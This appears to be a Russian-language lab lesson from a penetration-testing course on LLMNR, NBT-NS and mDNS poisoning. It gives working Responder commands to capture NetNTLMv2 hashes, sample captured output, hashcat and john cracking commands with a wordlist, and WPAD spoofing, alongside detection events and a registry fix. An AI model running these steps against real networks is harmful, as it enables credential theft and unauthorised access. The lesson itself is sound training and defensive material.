# 7.2 — LLMNR, NBT-NS, mDNS poisoning

> **M07 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m07-network-attacks/l02-responder/`

## Цель

Поймать NetNTLMv2-хэш, который Windows отправляет при неудачном разрешении имени, и понять, почему это происходит в любой сети по умолчанию.

## Результат

- Responder собирает хэш от WS01.
- Хэш ломается по словарю (или фиксируется, что пароль стойкий).
- Понимание, как отключить эти протоколы.

## Теория

- LLMNR (UDP 5355), NBT-NS (UDP 137), mDNS (UDP 5353) — fallback-механизмы, когда DNS не ответил.
- Запрос broadcast: «кто такой `fileserver`?». Любой может ответить.
- Windows автоматически отправляет NTLM-аутентификацию на ответивший хост.
- Responder отвечает на запросы и сохраняет NetNTLMv2: `user::domain:challenge:response:blob`.
- Хэш нельзя использовать для pass-the-hash (это не NT hash), но можно ломать офлайн.
- Включённые по умолчанию LLMNR/NBT-NS — причина, почему «внутренняя сеть доверенная» не работает.

## Лаборатория

### 1. Запустить Responder

```bash
sudo responder -I eth0 -rdw
```

Флаги: `-r` (respond), `-d` (DHCP), `-w` (WPAD). В лаборатории достаточно `-I eth0 -rdw`.

Ожидаемо: Responder слушает и ждёт запросы.

### 2. Спровоцировать запрос

На WS01 (от имени доменного пользователя):

```powershell
dir \\fileserver01\share
```

Ожидаемо: ошибка доступа/не найден, а в консоли Responder:

```
[LLMNR] Poisoned answer sent to 10.10.10.20 for name fileserver01
[SMB] NTLMv2-SSP Client : 10.10.10.20
[SMB] NTLMv2-SSP Username : LAB\alice
[SMB] NTLMv2-SSP Hash : alice::LAB:...
```

### 3. Сохранить и сломать

Скопируйте хэш в `responder/hashes.txt` (в одну строку). Затем:

```bash
hashcat -m 5600 responder/hashes.txt /usr/share/wordlists/rockyou.txt
```

Если `rockyou` нет:

```bash
paru -S wordlists   # или скачайте SecLists
```

Ожидаемо: пароль `Passw0rd!` найден, если он в словаре. Если нет — хэш всё равно ценен для отчёта.

Альтернатива: `john --format=netntlmv2 hashes.txt --wordlist=...`.

### 4. WPAD (если сработает)

Responder с `-w` может ответить на WPAD и подсунуть прокси. В лаборатории проверьте, ходит ли WS01 за `wpad`. Если нет — это нормально, современные Windows часто отключают.

### 5. Отключить (проверка гипотезы)

На WS01:

```powershell
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast /t REG_DWORD /d 0 /f
```

Отключите NetBIOS over TCP/IP в свойствах адаптера (или через DHCP-опцию). Перезапустите Responder и повторите `dir \\fileserver01\share`.

Ожидаемо: хэш больше не приходит (или приходит только mDNS, если не отключён).

## Атака и защита

- **Атака:** кража NetNTLMv2 → офлайн-подбор → доступ; relay (следующий урок).
- **Детект:** Responder-подобные ответы, аномальные LLMNR/mDNS, Event 4624 type 3, 4776.
- **Фикс:** отключить LLMNR/NBT-NS/mDNS через GPO, DNS strict, SMB signing, 802.1X, сегментация.

## Самопроверка

- [ ] Почему Windows вообще отправляет NTLM на broadcast-ответ?
- [ ] Чем NetNTLMv2 отличается от NT hash?
- [ ] Почему отключение LLMNR ломает Responder?
- [ ] Что показывает Event 4776?

## Дальше

[7.3 — SMB relay](l03-smb-relay.md)
